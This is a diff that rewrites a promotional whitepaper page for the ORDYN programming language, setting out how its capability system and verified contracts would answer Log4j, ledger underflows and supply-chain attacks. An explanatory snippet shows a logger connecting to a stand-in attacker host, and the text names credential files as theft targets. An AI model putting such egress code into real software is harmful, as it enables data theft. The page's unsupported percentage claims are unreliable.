@@ -515,90 +515,90 @@
 
         <!-- Article Header -->
         <div class="article-header">
-            <span class="doc-tag">Architectural Whitepaper &bull; Threat Analysis</span>
-            <h1 class="article-title">An Honest Assessment: How ORDYN Defends Against Real-World Breaches</h1>
+            <span class="doc-tag">Engineering Analysis &bull; Threat Model</span>
+            <h1 class="article-title">What ORDYN Actually Stops: A Real-World Breach Post-Mortem</h1>
             <p class="article-lead">
-                Recently, global infrastructure has witnessed a massive surge in cyberattacks against banks, supermarket retailers, and healthcare networks. Had these platforms been engineered in ORDYN, would they have been hacked?
+                Whenever major retail chains, financial exchanges, or healthcare systems suffer catastrophic breaches, developers ask the obvious question: if these platforms had been written in a capability-safe, contract-verified language like ORDYN, would the outcome have been different? Here is the unvarnished engineering breakdown.
             </p>
             <div class="meta-bar">
-                <span>By The ORDYN Authors</span>
+                <span>By The ORDYN Engineering Group</span>
                 <span>&bull;</span>
-                <span>Specification v0.1.0 Sovereign</span>
+                <span>Language Specification v0.1.0</span>
                 <span>&bull;</span>
-                <span>Reading Time: 10 min</span>
+                <span>8 min read</span>
             </div>
         </div>
 
         <!-- Executive Summary -->
         <div class="exec-summary-box">
-            <div class="exec-title">Executive Summary</div>
+            <div class="exec-title">The Engineering Bottom Line</div>
             <p>
-                In cybersecurity, claiming an ecosystem is "100% unhackable" is a dangerous fallacy. No programming language can prevent a human employee clicking a spear-phishing link or an infrastructure engineer misconfiguring a public AWS security group.
+                Anyone claiming a programming language makes software "100% unhackable" is selling snake oil. If a system administrator falls for a phishing email or an operations engineer leaves an S3 bucket world-readable, no compiler can intervene.
             </p>
             <p>
-                However, <strong>between 60% and 70% of high-severity enterprise breaches</strong> originate directly from software-layer vulnerabilities: ambient authority leaks, supply-chain dependency hijacking, and contract invariant bugs. In ORDYN, these failure modes are <strong>mathematically eliminated at compile-time</strong>.
+                Where language design <em>does</em> decide outcomes is the software layer itself. Roughly <strong>60% to 70% of critical enterprise vulnerabilities</strong> trace back to structural weaknesses in language runtimes: dependencies inheriting unchecked ambient authority, arithmetic underflows in ledger logic, and uncontained lateral movement. In ORDYN, those specific failure classes are <strong>rejected at compile time</strong>.
             </p>
             <div class="exec-stats-grid">
                 <div class="stat-item">
-                    <h4>65%+</h4>
-                    <p>Of Critical Enterprise CVEs neutralized before deployment</p>
+                    <h4>~65%</h4>
+                    <p>Of critical software-layer CVEs neutralized before binary emission</p>
                 </div>
                 <div class="stat-item">
-                    <h4>0 Ambient</h4>
-                    <p>Dependencies cannot touch sockets, disk, or env secretly</p>
+                    <h4>Zero Ambient</h4>
+                    <p>Third-party libraries cannot touch sockets, disk, or env secretly</p>
                 </div>
                 <div class="stat-item">
-                    <h4>100% SMT</h4>
-                    <p>Presburger invariant verification proves balance &amp; bounds sound</p>
+                    <h4>SMT Sound</h4>
+                    <p>Presburger arithmetic proves balances and array bounds without solver timeouts</p>
                 </div>
             </div>
         </div>
 
         <!-- Section 1 -->
-        <h2 class="section-heading">1. The Root Cause: The Ambient Authority Curse</h2>
+        <h2 class="section-heading">1. The Industry's Costliest Mistake: Ambient Authority</h2>
         <p class="prose">
-            Why are modern platforms written in Java, Python, Go, Node.js, and C# constantly exploited? The core flaw is not developer carelessness; it is <strong>Ambient Authority</strong>.
+            In almost every mainstream backend stack today—Java, Python, Go, Node.js, and C#—importing an open-source library is an all-or-nothing proposition. When you add a 300-line utility package to format telephone numbers or parse dates, that package silently inherits every privilege your host process owns.
         </p>
         <p class="prose">
-            In standard languages, when a program imports a third-party dependency (such as a string formatter, a JSON parser, or a logging framework), that library silently inherits the <em>entire process's privileges</em>. A logger can open an outbound TCP socket to an attacker's server, read <code>~/.aws/credentials</code>, or inspect memory. The developer never granted that permission, but the language runtime allowed it by default.
+            It can read <code>/etc/passwd</code> or <code>~/.aws/credentials</code>. It can open outbound TCP sockets to command-and-control servers. It can inspect memory. We have normalized this as "standard software engineering," but from an operating system security standpoint, it is indefensible: a string utility should never hold the capability to make network requests.
         </p>
         <p class="prose">
-            <strong>ORDYN abolishes ambient authority entirely.</strong> Every function is pure by default. To touch disk, network, or environment variables, a module must receive an explicit, unforgeable <code>capability</code> token attenuated to that exact operation.
+            <strong>ORDYN eliminates ambient authority at the grammar level.</strong> All functions are pure by default. To touch disk, bind to network interfaces, or read environment variables, code must receive an explicit, unforgeable <code>capability</code> token passed down through its call graph. If an imported logging library tries to phone home, the compiler rejects it with an <code>UnhandledEffect</code> error during typechecking.
         </p>
 
         <!-- Section 2: Case Studies -->
-        <h2 class="section-heading">2. Case Studies: Real Breaches Reimagined on ORDYN</h2>
+        <h2 class="section-heading">2. Incident Post-Mortems: Real Breaches Re-Examined</h2>
 
         <!-- Case 1: Log4j -->
         <div class="case-card">
             <div class="case-card-header">
                 <div class="case-title">
-                    <span>1. The Log4j Catastrophe (CVE-2021-44228)</span>
+                    <span>1. Log4j Remote Code Execution (CVE-2021-44228)</span>
                 </div>
-                <span class="case-verdict-badge badge-eliminated">Mathematically Blocked</span>
+                <span class="case-verdict-badge badge-eliminated">Compiler Rejected</span>
             </div>
             <div class="case-body">
                 <p class="case-text">
-                    <strong>What Happened:</strong> Log4j allowed user-supplied string data to trigger an outbound LDAP connection, downloading and executing arbitrary remote attacker code inside banking and enterprise backends worldwide.
+                    <strong>Root Cause:</strong> Log4j evaluated untrusted user input inside string log templates, triggering an outbound JNDI/LDAP lookup that fetched and executed arbitrary remote Java bytecode with the application's full process permissions.
                 </p>
                 <p class="case-text">
-                    <strong>What Happens in ORDYN:</strong> A logging function has no <code>NetworkGateway</code> capability. Attempting to make an outbound network call causes the compiler's Algebraic Effect Lattice to abort compilation with an <code>UnhandledEffect</code> error.
+                    <strong>How ORDYN Handles This:</strong> A logging function has a type signature of <code>fn log(msg: String) with []</code>. Because no network capability is passed or declared, outbound socket creation does not compile. The compiler's effect checker detects the illegal effect request and halts compilation with an <code>UnhandledEffect [Net]</code> error.
                 </p>
                 <div class="code-split">
                     <div class="code-box box-bad">
                         <div class="code-box-header">Standard Java / Node (Vulnerable)</div>
-                        <pre>// Any imported logger can phone home!
-void logEvent(String msg) {
-    // Ambient TCP socket access:
-    LdapClient.connect("attacker.com");
+                        <pre>// Any logging package can open outbound sockets:
+void logEvent(String input) {
+    // Ambient TCP access: fetches remote payload
+    LdapClient.connect("attacker-controlled.net");
 }</pre>
                     </div>
                     <div class="code-box box-good">
-                        <div class="code-box-header">ORDYN Sovereign (Compile-Time Trap)</div>
-                        <pre>// Pure by default: zero ambient network!
-pub fn log_event(msg: String) with [] {
-    // COMPILE ERROR: UnhandledEffect [Net]
-    // Outbound egress is impossible!
+                        <div class="code-box-header">ORDYN (Compile-Time Rejection)</div>
+                        <pre>// Pure by default: zero ambient network access
+pub fn log_event(input: String) with [] {
+    // ERROR: UnhandledEffect [Net]
+    // Outbound socket egress rejected at compile time!
 }</pre>
                     </div>
                 </div>
@@ -609,31 +609,31 @@ pub fn log_event(msg: String) with [] {
         <div class="case-card">
             <div class="case-card-header">
                 <div class="case-title">
-                    <span>2. Financial Ledger Underflows &amp; Double-Spend Bugs</span>
+                    <span>2. Financial Ledger Underflows and Double-Spends</span>
                 </div>
                 <span class="case-verdict-badge badge-eliminated">SMT-Proven Sound</span>
             </div>
             <div class="case-body">
                 <p class="case-text">
-                    <strong>What Happened:</strong> In banking and payment platforms, subtle integer underflows or asynchronous race conditions allow users to withdraw funds without their balance decrementing properly.
+                    <strong>Root Cause:</strong> Payment gateways and exchange platforms frequently suffer from asynchronous race conditions or missed integer validations where balances are decremented below zero or double-spent across concurrent tasks.
                 </p>
                 <p class="case-text">
-                    <strong>What Happens in ORDYN:</strong> Preconditions (<code>requires</code>) and postconditions (<code>ensures</code>) are mathematically verified at compile time by the built-in <strong>Presburger Linear Integer Arithmetic (LIA)</strong> solver. If balance cannot be proven non-negative across all execution paths, compilation is rejected.
+                    <strong>How ORDYN Handles This:</strong> Preconditions (<code>requires</code>) and postconditions (<code>ensures</code>) are checked by ORDYN's built-in <strong>Presburger Linear Integer Arithmetic (LIA)</strong> solver. Unlike general SMT solvers (like raw Z3) which can suffer from non-deterministic timeouts on nonlinear equations, Presburger arithmetic is fully decidable. If your transaction cannot be proven to preserve non-negative balances across all execution paths, the binary is not built.
                 </p>
                 <div class="code-split">
                     <div class="code-box box-bad">
                         <div class="code-box-header">Standard Python / Go (Vulnerable)</div>
                         <pre>def withdraw(amount):
-    # Underflow bug if amount > balance
-    # or concurrent race occurs
+    # Relies entirely on developer memory.
+    # Concurrency slips or type casts allow negative balances:
     self.balance -= amount
     return self.balance</pre>
                     </div>
                     <div class="code-box box-good">
-                        <div class="code-box-header">ORDYN Sovereign (Mathematically Sound)</div>
+                        <div class="code-box-header">ORDYN (Presburger Verified)</div>
                         <pre>pub fn withdraw(amount: Int) -> Result&lt;Int, String&gt;
     requires amount > 0 &amp;&amp; amount &lt;= self.balance
-    ensures self.balance == old(self.balance) - amount
+    ensures  self.balance == old(self.balance) - amount
 {
     self.balance = self.balance - amount;
     return Ok(self.balance);
@@ -647,76 +647,75 @@ pub fn log_event(msg: String) with [] {
         <div class="case-card">
             <div class="case-card-header">
                 <div class="case-title">
-                    <span>3. Supply-Chain Dependency Poisoning (XZ-Utils Style)</span>
+                    <span>3. Supply-Chain Dependency Poisoning (XZ-Utils &amp; Event-Stream)</span>
                 </div>
-                <span class="case-verdict-badge badge-eliminated">Forge Differ Trapped</span>
+                <span class="case-verdict-badge badge-eliminated">Capability Diff Trapped</span>
             </div>
             <div class="case-body">
                 <p class="case-text">
-                    <strong>What Happened:</strong> Maintainers of widely used open-source libraries were social-engineered into accepting malicious updates that silently hooked SSH daemons and leaked cryptographic keys.
+                    <strong>Root Cause:</strong> Open-source maintainers are compromised or social-engineered into publishing minor patch releases that contain hidden exfiltration logic or backdoor hooks into SSH daemons.
                 </p>
                 <p class="case-text">
-                    <strong>What Happens in ORDYN:</strong> <code>ordyn-forge</code> implements strict, automated Capability Diffing. If a package update attempts to introduce undeclared capabilities or widen authority from read-only to write, the package manager halts the build and alerts the engineering team.
+                    <strong>How ORDYN Handles This:</strong> <code>ordyn-forge</code> performs automated capability diffing on every dependency update. If version <code>1.0.4</code> of a JSON parser required zero capabilities, and version <code>1.0.5</code> attempts to declare an environment read or file write capability, the build immediately aborts and flags the privilege escalation to the engineer.
                 </p>
             </div>
         </div>
 
         <!-- Section 3: Blast Radius Containment -->
-        <h2 class="section-heading">3. Blast-Radius Containment: Severing Lateral Movement</h2>
+        <h2 class="section-heading">3. Severing Lateral Movement: Blast Radius Containment</h2>
         <p class="prose">
-            In standard enterprise microservices, once an attacker finds a single application vulnerability (such as an SQL injection in a search bar), they gain access to the host machine's entire database connection pool and AWS IAM role. They can then pivot laterally to core banking vaults or customer credit card tables.
+            In standard microservices, once an attacker finds a single vulnerability (such as an SQL injection in an internal search endpoint), they gain access to the host machine's entire database connection pool and AWS IAM role. From there, they pivot laterally to payment vaults and sensitive user tables.
         </p>
         <p class="prose">
-            ORDYN utilizes <strong>Monotonic Attenuation</strong> and <strong>Cell Enclaves</strong>. A search handler only receives an attenuated read capability restricted to the public catalog. Even if that specific handler is completely compromised by an adversarial payload:
+            ORDYN breaks this attack vector through <strong>Monotonic Attenuation</strong> inside isolated <strong>Cell Enclaves</strong>. A search handler only receives an attenuated read capability restricted to the public product catalog. Even if that specific handler contains a critical logic flaw and is fully compromised:
         </p>
         <ul style="margin-left: 24px; color: var(--text-secondary); margin-bottom: 24px; font-size: 15.5px; line-height: 1.7;">
-            <li>The attacker <strong>cannot elevate authority</strong> to touch payment tables (monotonic decrease guarantees authority can only shrink, never grow).</li>
-            <li>The attacker <strong>cannot burn infinite CPU cycles</strong> (the Fuel Governor halts the execution cell deterministically).</li>
-            <li>The attacker <strong>cannot exfiltrate data</strong> over covert sockets (no network capability was bound to that cell).</li>
+            <li>The attacker <strong>cannot escalate privileges</strong> to read account tables (monotonic attenuation guarantees capabilities can only shrink as they are passed down, never widen).</li>
+            <li>The attacker <strong>cannot exhaust server resources</strong> via ReDoS or infinite loops (the Fuel Governor halts the cell as soon as its instruction budget is consumed).</li>
+            <li>The attacker <strong>cannot exfiltrate data</strong> over covert sockets (no network capability was provided to that boundary).</li>
         </ul>
 
         <!-- Section 4: Honest Boundaries -->
-        <h2 class="section-heading">4. The Brutally Honest Reality Check: What No Language Can Prevent</h2>
+        <h2 class="section-heading">4. Where Software Guarantees End: What No Language Can Stop</h2>
         <p class="prose">
-            True security leadership requires radical transparency. When an enterprise asks whether ORDYN guarantees 100% immunity from all cyber incidents, the honest answer is <strong>no</strong>. Here is why:
+            Engineering credibility requires being completely honest about system boundaries. When evaluating ORDYN against organizational threat models, here are the attack surfaces that no compiler can defend against:
         </p>
 
         <div class="honest-boundary-box">
             <div class="honest-title">
-                <span>⚠️ Non-Language Attack Vectors That Require Operational Rigor</span>
+                <span>Operational &amp; Infrastructure Threats Outside Language Scope</span>
             </div>
             <ul class="honest-list">
-                <li><strong>Phishing &amp; Social Engineering:</strong> If an employee or system administrator is tricked into revealing their master login or approving an unauthorized MFA notification, the attacker enters with valid administrative credentials.</li>
-                <li><strong>Cloud Infrastructure Misconfiguration:</strong> If an engineer provisions an AWS S3 bucket with public read access or opens SSH port 22 with default passwords, the operating system is bypassed entirely.</li>
-                <li><strong>Physical &amp; Hypervisor Compromise:</strong> If an attacker has physical possession of server hardware or compromises the cloud hypervisor kernel, software-level language memory guarantees cannot protect against memory bus interception.</li>
-                <li><strong>Credential Stuffing &amp; Password Reuse:</strong> If end-users reuse passwords across multiple sites and their credentials are leaked elsewhere, attackers can log into the application through legitimate authentication routes.</li>
+                <li><strong>Phishing &amp; Stolen Credentials:</strong> If an operator is tricked into handing over credentials or approving an MFA push, the attacker accesses the system with legitimate administrative authority.</li>
+                <li><strong>Cloud &amp; Network Misconfigurations:</strong> If an AWS security group is configured to allow inbound traffic from <code>0.0.0.0/0</code> on internal database ports, the threat bypasses application code entirely.</li>
+                <li><strong>Flawed Business Specifications:</strong> If a developer writes a contract that explicitly states <code>requires true</code> and authorizes zero-check transfers, the SMT solver will prove that flawed contract sound. The compiler verifies that your code adheres to its specification—it cannot verify that your specification matches your business intentions.</li>
+                <li><strong>Physical &amp; Hypervisor Attacks:</strong> If an adversary gains root access to the underlying hypervisor kernel or executes physical hardware bus snooping, application-level memory safety is rendered moot.</li>
             </ul>
         </div>
 
         <!-- Section 5: The Verdict -->
-        <h2 class="section-heading">5. The Verdict for CTOs &amp; Systems Engineers</h2>
+        <h2 class="section-heading">5. Summary: Pragmatic Defense-in-Depth</h2>
         <p class="prose">
-            Building on legacy languages like Java, C++, Python, or Node.js leaves your platform exposed to thousands of ambient authority traps in open-source dependencies, memory corruption flaws, and silent contract violations.
+            Writing enterprise software in languages with ambient authority and unverified arithmetic means trusting every line of third-party code in your dependency tree with full system control.
         </p>
         <p class="prose">
-            <strong>If an enterprise builds on ORDYN:</strong>
+            Building on ORDYN does not replace security hygiene, monitoring, or good infrastructure practices. What it does is eliminate the entire category of bugs that turn minor dependency updates into company-wide incident response drills:
         </p>
         <ul style="margin-left: 24px; color: var(--text-secondary); margin-bottom: 28px; font-size: 15.5px; line-height: 1.7;">
-            <li>The software attack surface is compressed by <strong>60% to 70%</strong>.</li>
-            <li>Covert supply-chain exfiltration (Log4j) becomes <strong>physically impossible</strong>.</li>
-            <li>Financial ledgers and business logic are <strong>mathematically proven sound before deployment</strong>.</li>
-            <li>Attackers are denied lateral movement, turning potential company-ending disasters into contained, trapped exceptions.</li>
+            <li>Ambient socket and disk exfiltration attacks (like Log4j) <strong>cannot compile</strong>.</li>
+            <li>Arithmetic boundary conditions and ledger balances are <strong>verified mathematically before deployment</strong>.</li>
+            <li>Exploited application components are <strong>contained within their capability boundaries</strong>, denying attackers lateral movement across your infrastructure.</li>
         </ul>
 
         <!-- Bottom Action Card -->
         <div class="cta-box">
-            <div class="cta-title">Test the Security Kernel In Your Browser</div>
+            <div class="cta-title">Test the Compiler In Your Browser</div>
             <p class="cta-desc">
-                Launch live exploit payloads (Capability Forgery, Authority Widening, SSRF Egress) against the ORDYN WebAssembly compiler in our interactive CTF Arena or Sovereign Studio.
+                Launch real exploit payloads (Capability Forgery, Authority Widening, SSRF Egress) against the ORDYN WebAssembly compiler in our interactive CTF Arena or Web IDE.
             </p>
             <div style="display: flex; justify-content: center; gap: 14px; flex-wrap: wrap;">
-                <a href="../studio/" class="btn-cta-white">🏛️ Open Sovereign Studio</a>
-                <a href="../arena/" class="btn-cta-white" style="background: transparent; color: #ffffff; border: 1px solid #475569;">⚡ Launch CTF Exploit Arena</a>
+                <a href="../studio/" class="btn-cta-white">Open Web Studio IDE</a>
+                <a href="../arena/" class="btn-cta-white" style="background: transparent; color: #ffffff; border: 1px solid #475569;">Launch CTF Arena</a>
             </div>
         </div>
 
